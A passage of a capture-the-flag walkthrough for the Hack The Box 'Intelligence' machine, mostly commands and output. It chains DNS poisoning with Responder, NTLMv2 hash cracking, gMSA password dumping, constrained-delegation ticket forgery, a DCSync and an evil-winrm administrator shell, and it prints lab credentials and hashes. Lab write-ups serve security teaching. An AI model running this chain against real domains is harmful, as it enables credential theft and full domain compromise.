</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>98/98<span class="o">)</span>, 65.76 KiB <span class="p">|</span> 426.00 KiB/s, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>48/48<span class="o">)</span>, <span class="k">done</span>.
</span></span></code></pre></div><p>Now I can use the tool to add a new ADIDNS record. This record points to my machine IP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 dnstool.py -u intelligence.htb<span class="se">\\</span>Tiffany.Molina -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -r <span class="s1">&#39;web-iamf.intelligence.htb&#39;</span> -a add -d 10.10.14.75 10.10.10.248 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connecting to host...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Binding to host
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl">/opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve<span class="o">()</span> instead
</span></span><span class="line"><span class="cl">  <span class="nv">res</span> <span class="o">=</span> dnsresolver.query<span class="o">(</span>zone, <span class="s1">&#39;SOA&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Adding new record
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> LDAP operation completed successfully
</span></span></code></pre></div><p>At the same time, I&rsquo;ll also start the Responder. Shortly after it runs, the Ted.Graves hash appear.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ sudo responder -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Client   : 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Username : intelligence<span class="se">\T</span>ed.Graves
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Hash     : Ted.Graves::intelligence:4cca110e84677c33:3A689C04E699DF8F6E1B16A599576ABA:0101000000000000E700D4082B7AD7012AF2C454A91E32400000000002000800340039003100540001001E00570049004E002D00500032003300360049003800390058003100530046000400140034003900310054002E004C004F00430041004C0003003400570049004E002D00500032003300360049003800390058003100530046002E0034003900310054002E004C004F00430041004C000500140034003900310054002E004C004F00430041004C000800300030000000000000000000000000200000AF0854B4C9903CBE8251A0173036E36C4E1F4A5399C97563C3922EC707733A310A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D00690061006D0066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</span></span></code></pre></div><h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>The hash can be cracked with <code>hashcat</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">5600</span> hashes/intelligence-ted.graves.hash ../../rockyou.txt -O                     ✘ INT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e699df8f6e1b16a599576aba:..<span class="o">[</span>SNIP<span class="o">]</span>..:Mr.Teddy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: NetNTLMv2
</span></span><span class="line"><span class="cl">Hash.Target......: TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e...000000
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The credentials are valid</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.248 -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> 
</span></span><span class="line"><span class="cl">SMB         10.10.10.248    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
<p>Even with user <code>Ted.Graves</code>, I still have no shell access. From here, I&rsquo;ll use BloodHound to explore more about the object relationships. I&rsquo;ll  use the Python ingestor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «BloodHound.py» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 bloodhound.py -c All -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248
</span></span><span class="line"><span class="cl">INFO: Found AD domain: intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">42</span> users
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">54</span> groups
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: svc_int.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Skipping enumeration <span class="k">for</span> svc_int.intelligence.htb since it could not be resolved.
</span></span><span class="line"><span class="cl">INFO: Done in 00M 21S
</span></span></code></pre></div><p>Using the pre-built analytics queries “Shortest Path from Owned Principal” reveals that user <code>Ted.Graves</code> has <code>readGMSAPassword</code> permission on a service account called <code>SVC_INT</code>. And the service account has <code>AllowedToDelegate</code> permission (constrained delegation) on the DC/Machine.</p>
<p><div class="img-container"><img src="imgs/image-20210716110136841.png" alt="image-20210716110136841"  /></div>
</p>
<h4 id="read-svc_init-password">Read SVC_INIT Password</h4>
<p>According to the help feature, <code>readGMSAPassword</code> allows you to retrieve GMSA (Group Managed Service Account) password. I&rsquo;ll also note that the password might be changed after some periods just like computer account (default 30 days).</p>
<p><div class="img-container"><img src="imgs/image-20210716110314851.png" alt="image-20210716110314851"  /></div>
</p>
<p>The author of this box has already created a tool for abusing this permission: <a href="https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py"target="_blank" rel="noopener noreferrer"
>gMSADumper.py</a>. Running it retuns the password of <code>svc_int$</code> in the form of NT hash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ./gMSADumper.py -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Users or groups who can <span class="nb">read</span> password <span class="k">for</span> svc_int$:
</span></span><span class="line"><span class="cl"> &gt; DC$
</span></span><span class="line"><span class="cl"> &gt; itsupport
</span></span><span class="line"><span class="cl">svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
</span></span></code></pre></div><p>Since the password is managed by the DC, I don&rsquo;t have to try to crack it.</p>
<h4 id="abusing-constrained-delegation---silver-ticket">Abusing Constrained Delegation -&gt; Silver Ticket</h4>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation"target="_blank" rel="noopener noreferrer"
>This site</a> explains what a constrained delegation is:</p>
<blockquote>
<p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it&rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p>
</blockquote>
<p>In this case, the service account <code>svc_int</code> can impersonate the domain admin and authenticate to <code>WWW/DC.INTELLIGENCE.HTB</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s2">&#34;Ted.Graves@intelligence.htb&#34;</span> -w <span class="s2">&#34;Mr.Teddy&#34;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;CN=svc_int,CN=Managed ServiceDC=intelligence,DC=htb&#34;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>With that, I can abuse this permission and perform <a href="https://attack.mitre.org/techniques/T1558/002/"target="_blank" rel="noopener noreferrer"
>Silver Ticket</a> attack, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ impacket-getST <span class="s1">&#39;intelligence.htb/svc_int$&#39;</span>  -spn <span class="s1">&#39;WWW\dc.intelligence.htb&#39;</span> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl">Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
</span></span></code></pre></div><p>To resolve that, I&rsquo;ll need to synchronize my machine time with the DC. This can be done with <code>ntpdate</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo apt install ntpdate <span class="o">&amp;&amp;</span> sudo ntpdate 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="m">18</span> Jul 14:57:39 ntpdate<span class="o">[</span>63324<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.10.248 offset +0.001305 sec
</span></span></code></pre></div><p>On the next attempt, I have obtained the admin ticket (TGS).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75»
</span></span><span class="line"><span class="cl">$ impacket-getST -spn <span class="s1">&#39;WWW/dc.intelligence.htb&#39;</span> -impersonate administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int<span class="se">\$</span>
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2self
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2Proxy
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache
</span></span></code></pre></div><h4 id="dcsync">DCSync</h4>
<p>Although the admin ticket was actually requested for <code>WWW\dc.intelligence.htb</code>, it actually can be used for other service, like DRS (Directory Replication Service) for DCSync attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache <span class="o">&amp;&amp;</span> impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:2362bc3191f23732
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span></code></pre></div><h4 id="shell-access">Shell Access</h4>
<p>With the administrator hash, I can use WinRM to get a shell access</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.248 -u <span class="s1">&#39;administrator&#39;</span> -H <span class="s1">&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">dc
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::a57a:d94f:fa40:87e6
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::a57a:d94f:fa40:87e6%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.248
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.254.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
